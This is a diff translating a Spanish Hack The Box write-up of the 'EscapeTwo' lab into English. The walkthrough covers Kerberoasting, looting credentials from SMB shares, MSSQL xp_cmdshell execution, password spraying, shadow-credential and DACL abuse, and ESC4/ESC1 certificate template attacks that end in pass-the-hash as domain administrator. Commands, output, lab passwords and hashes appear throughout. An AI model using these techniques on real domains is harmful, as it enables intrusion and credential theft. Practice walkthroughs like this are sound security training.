@@ -4,7 +4,7 @@ As is common in real life Windows pentests, you will start this box with credent
 
 # Enumeration
 
->Realizamos un escaneo de puertos TCP con mi herramienta automatizada de escaneo:
+>We carried out a TCP port scan using my automated scanning tool:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -121,7 +121,7 @@ Puertos TCP abiertos:
 |_    Message signing enabled and required
 ```
 
-> Vamos a enumerar la versión de Windows y el dominio de Active Directory empleando crackmapexec:
+> Let's list the Windows version and the Active Directory domain using crackmapexec:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -129,14 +129,14 @@ Puertos TCP abiertos:
 SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:sequel.htb) (signing:True) (SMBv1:False)
 ```
 
-> Vamos a agregar el dominio a nuestro resolutor local (/etc/hosts) para que pueda resolver el nombre de dominio:
+> Let's add the domain to our local host file (/etc/hosts) so that it can resolve the domain name:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
 └─$ echo "10.129.231.236 DC01.sequel.htb sequel.htb" >> /etc/hosts
 ```
 
->Al tratar de hacer un Kerberoast vemos que existen 2 SPN que nos permiten obtener el ticket TGS de dos usuarios, sql_svc y ca_svc:
+>When attempting to carry out a Kerberoast, we see that there are two SPNs that allow us to obtain the TGS ticket for two users, sql_svc and ca_svc:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -155,9 +155,9 @@ $krb5tgs$23$*sql_svc$SEQUEL.HTB$sequel.htb/sql_svc*$11620869f22d64b929d610a93dc4
 $krb5tgs$23$*ca_svc$SEQUEL.HTB$sequel.htb/ca_svc*$059912b694c91d20d081f775ad16bc14$d1879b61d53fc8447e04792c82e8d75237dd956d5aac31ef45723af6fbe136db32d5f3d020fb90b3e28fde1b4746b8a6ed5366bf48206c6367b41928213f46017e2047c1b8efd4cf275718a9d91e9b70dc29d6745a0c1478602cc969e5541cd341aaba863cb1c33ea501d13982e942bc05d8af4b00c335f1960ac7686f867a4fe8a808ef342cb67991e60a1f172eae1bcb97cac008a2e515888a22627aeabe77c7637fae439d14d772a6cea4bf5cf2e5353706782144f81ae21bfc1828152c9894a13e572a62964fddba860b40bcb0c5ff8ad0044baaa0e24869f32b244e44dbbe77866e281e352e3f4c0b2bcf74639057c6f8bfc6b444f0ab0ce5a82c3cff7cd97f5c4386f6a5a14bd3f58c213d0f4b9622ecbb4bc96f8e0aab42097bd0bb1307f9354b0d59c17b5b56b3f06e693e948de1910669d19fb96160647d052c3588f30762558ab6d5e3847b63526c0bc3ea9a0b76421e9dcd33f63fc1a3dd7ff4f5be3a130e542276ac7781e0caf10f00badd92ce6f7f63e4054d2b2c663debcb664d02d304012366228277ba457e40b8d3eede8e07c15d846cc5a4d6e02903e8976705855e021e324aecc817c84084c83804df59a19721d38b8c08a8ee92df09363b6912955337b2fcf3191bc14b78d60dfe1737aa368155862d7247ed673e11a14888493e570d88a3422bc63bf831f98c58828d1bfb56e096c773e54355b8222711d0892f525ad1fa13caaf16b11fc866b0f19d28a041cac8b411a0b9a12a8cad960f08725ffafe4f391e5cad23cd12140c1bf34d3da7aa211e7f9dcfdad4857133eba582de0d48d0d15fd1717aeaedf448ce844d5649f9f89b6f17444dba4504a8e724539f25810685e8751644a000e0cc2b3b883df0b7b3f4622de620eff80660ae49aee06a07b4e72652a9db362bd46f66a5f48ea3f6e4af1781a9d73eb3fc6e118926cb9bc61619b9b30a0950a2731f3e4aa3396b76a67026d752b1d4656bc672483ea8e7729383401240471b441d2d1ab746a1639a8694a3b2700f46b79669b631f5ed34384e5eb6f6f60cb80a655b22bb8fe450322a3cac28bb6680117a269abc2aad3f25a9b61dbf1e2b3b666d2bfde7eb2e17149e0d073cf334631e82dbfb369e96549ca887c3daabd071da44441b5bcd25cbff516a07ae4bbc0540c8561ca02cfb22d18e9d03e63a8d4b33b96c76acd62998a042a37856a8e873510ebd029100106474d1e5770160081269db4882ad856b7ac30dd74c626d5378af97edd258a618a729354d628325a1bb224f1a6df75a52172af1f25ece69193449da0f669c22c3671fe0f4db23b84e94e03ff9afc838e6247ec02a4c301e877253cde41fe3661e49d2ed07f255131fb4abcf740e93d39aedc5458b4c9a30268817dd85a367b0079ad1a0db9e30716eae64
 ```
 
->Vamos a crackearlos con hashcat empleando la máscara correspondiente, es decir, la 13100, tras emplear el rockyou con ambos hashes ninguno es crackeable facilmente.
+>We're going to crack them with Hashcat using the appropriate mask, namely 13100; after running Rockyou on both hashes, neither can be cracked easily.
 
->Vamos a obtener archivos para analizar con bloodhound empleando el collector bloodhound-python:
+>We’re going to retrieve files to analyse with Bloodhound using the bloodhound-python collector:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -192,16 +192,16 @@ INFO: Done in 00M 12S
   adding: 20250421150856_users.json (deflated 93%)
 ```
 
->Abrimos bloodhound, iniciamos el servicio de base de datos neo4j e importamos el archivo zip a bloodhound:
+>We open Bloodhound, start the Neo4j database service and import the zip file into Bloodhound:
 
 ```bash
 sudo neo4j start
 bloodhound &>/dev/null & disown
 ```
 
->Pero al analizarlo, con el usuario que tenemos no hay ningún dato interesante.
+>But on closer inspection, there is no interesting data for the user we have.
 
->Si tratamos de listar las shares con el usuario que nos han brindado vemos varias que son accesibles, siendo la de Accounting Department la más interesante:
+>If we try to list the shares associated with the user we’ve been given, we see several that are accessible, with the one for the Accounting Department being the most interesting:
 
 ```bash
 ┌──(kali㉿jbkira)-[~]
@@ -220,7 +220,7 @@ SMB         10.129.231.236  445    DC01             SYSVOL          READ        
 SMB         10.129.231.236  445    DC01             Users           READ  
 ```
 
->Aquí vemos una hoja de cálculo de excel llamada Accounts que probablemente contenga credenciales:
+>Here we see an Excel spreadsheet called ‘Accounts’ which probably contains login details:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -238,7 +238,7 @@ smb: \> get accounts.xlsx
 getting file \accounts.xlsx of size 6780 as accounts.xlsx (15.5 KiloBytes/sec) (average 15.5 KiloBytes/sec)
 ```
 
->En este archivo podemos encontrar las siguientes credenciales:
+>In this file, we can find the following credentials:
 
 ```
 angela:0fwz7Q4mSpurIt99
@@ -247,7 +247,7 @@ kevin:Md9Wlq1E5bZnVDVo
 sa:MSSQLP@ssw0rd!
 ```
 
->De estas una que destaca es la del usuario sa que suele ser empleado en las bases de datos MSSQL, vamos a probar a conectarnos mediante la herramienta de Impacket mssqlclient
+>One that stands out is the sa user, which is commonly used in MSSQL databases; let’s try connecting using the Impacket mssqlclient tool
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -265,7 +265,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 SQL (sa  dbo@master)> 
 ```
 
->Aquí podemos habilitar xp_cmdshell para poder ejecutar comandos de forma remota:
+>Here we can enable xp_cmdshell so that we can run commands remotely:
 
 ```bash
 SQL (sa  dbo@master)> enable_xp_cmdshell
@@ -277,7 +277,7 @@ output
 sequel\sql_svc
 ```
 
->Si enumeramos los archivos del sistema, vemos un directorio no convencional que contiene la contraseña en texto plano del usuario sql_svc:
+>If we list the files on the system, we see an unconventional directory containing the password for the user sql_svc in plain text:
 
 ```powershell
 SQL (sa  dbo@master)> xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
@@ -298,7 +298,7 @@ SAPWD="MSSQLP@ssw0rd!"
 <SNIP>
 ```
 
->Vamos a probar si son válidas:
+>Let's see if they're valid:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -307,7 +307,7 @@ SMB         10.129.231.236  445    DC01             [*] Windows 10 / Server 2019
 SMB         10.129.231.236  445    DC01             [+] sequel.htb\sql_svc:WqSZAF6CysDQbGb3
 ```
 
->Vemos que son válidas así que vamos a ver si algún otro usuario del dominio posee la misma contraseña, para ello necesitamos previamente una lista con los usuarios del dominio:
+>We can see that they are valid, so let's check whether any other user in the domain has the same password. To do this, we first need a list of the domain's users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -326,7 +326,7 @@ SMB         10.129.231.236  445    DC01             sequel.htb\Guest            
 SMB         10.129.231.236  445    DC01             sequel.htb\Administrator                  badpwdcount: 0 desc: Built-in account for administering the computer/domain
 ```
 
->Vamos a tratar el texto para quedarnos solo con los usuarios:
+>Let's process the text so that we're left with just the users:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -342,7 +342,7 @@ Guest
 Administrator
 ```
 
->Ahora si tratamos de hacer el Password Spray vemos que el usuario ryan usa esa misma contraseña:
+>Now, if we try the Password Spray, we can see that the user ryan uses that very same password:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -364,15 +364,15 @@ Version: dev (n/a) - 04/21/25 - Ronnie Flathers @ropnop
 2025/04/21 15:42:00 >  Done! Tested 9 logins (2 successes) in 0.253 seconds
 ```
 
->Vemos que este usuario tiene permisos WriteOwner sobre el usuario ca_svc, el cual lo podemos explotar para obtener acceso a dicha cuenta:
+>We can see that this user has WriteOwner permissions for the user ca_svc, which we can exploit to gain access to that account:
 
 ![image](https://github.com/user-attachments/assets/5f4cb418-bfd5-4257-900b-655716a12cc5)
 
->También vemos que pertenece al grupo Remote Management Users, grupo el cual podemos abusar para acceder como este usuario al DC mediante WinRM:
+>We can also see that it belongs to the Remote Management Users group, which we can exploit to gain access to the DC as this user via WinRM:
 
 ![image](https://github.com/user-attachments/assets/3ceae475-d49e-4bb6-a61a-96d2ea116069)
 
->Accedemos al DC por WinRM y vemos la flag user.txt:
+>We access the DC via WinRM and see the flag in user.txt:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -393,9 +393,9 @@ Mode                LastWriteTime         Length Name
 
 # Privilege Escalation
 
->Para abusar los privilegios que tiene el usuario ryan sobre el usuario ca_svc deberemos hacer un Shadow Credential Attack:
+>To exploit the privileges that the user ryan has over the user ca_svc, we need to carry out a shadow credential attack:
 
->Primero, cambiamos el ownership de la cuenta:
+>First, we change the account ownership:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -410,7 +410,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] OwnerSid modified successfully!
 ```
 
->Después, cambiamos las ACL para garantizarnos FullControl sobre la cuenta:
+>Next, we changed the ACLs to ensure we had FullControl over the account:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -422,7 +422,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] DACL modified successfully!
 ```
 
->Ahora emplearemos pywhisker para crear un certificado que nos permita pedir el TGT del usuario ca_svc:
+>We will now use pywhisker to create a certificate that will allow us to request the TGT for the user ca_svc:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -441,7 +441,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
 ```
 
->Juntamos los certificados creando uno .pfx:
+>We combine the certificates to create a .pfx file:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -451,7 +451,7 @@ Enter Export Password:
 Verifying - Enter Export Password:
 ```
 
->Empleamos certipy y obtenemos el hash NTLM del usuario y un archivo ccache que podemos emplear para hacer Pass-The-Ticket
+>We use Certipy to obtain the user’s NTLM hash and a ccache file, which we can use to carry out a Pass-The-Ticket attack
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -470,7 +470,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'ca_svc@sequel.htb': aad3b435b51404eeaad3b435b51404ee:3b181b914e7a9d5508ea1e20bc2b7fce
 ```
 
->Vamos a revisar si posee vulnerabilidades de AD CS:
+>Let's check whether it has any AD CS vulnerabilities:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -492,14 +492,14 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved JSON output to '20250421162050_Certipy.json'
 ```
 
->Si abrimos el archivo json resultante vemos que es vulnerable a :
+>If we open the resulting JSON file, we can see that it is vulnerable to ESC4:
 
 ```bash
 "[!] Vulnerabilities": {
         "ESC4": "'SEQUEL.HTB\\\\Cert Publishers' has dangerous permissions"
 ```
 
->Como es vulnerable vamos a realizar un ataque ECS1, para ello, primero creamos un backup de la template:
+>As it is vulnerable, we are going to modify the template so that we can carry out an ESC1 attack on it. To do this, we will first create a backup of the template:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -512,7 +512,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Successfully updated 'DunderMifflinAuthentication'
 ```
 
->Después, deberemos realizar el ataque ECS1, dándonos un certificado .pfx del administrador:
+>Next, we'll need to carry out the ESC1 attack, which will give us a .pfx certificate from the administrator:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -528,7 +528,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Saved certificate and private key to 'administrator.pfx'
 ```
 
->Por último, empleamos el certificado resultante para obtener el hash NTLM del usuario administrador de la siguiente forma:
+>Finally, we use the resulting certificate to obtain the NTLM hash for the administrator user as follows:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
@@ -544,7 +544,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
 ```
 
->Ahora empleamos este hash para hacer un PTH para loguearnos mediante evil-winrm como el usuario administrador en el DC, donde podemos ver la flag root.txt:
+>We now use this hash to generate a PTH to log in via evil-winrm as the administrator user on the DC, where we can view the root.txt flag:
 
 ```bash
 ┌──(kali㉿jbkira)-[~/Desktop/machines/escapetwo]
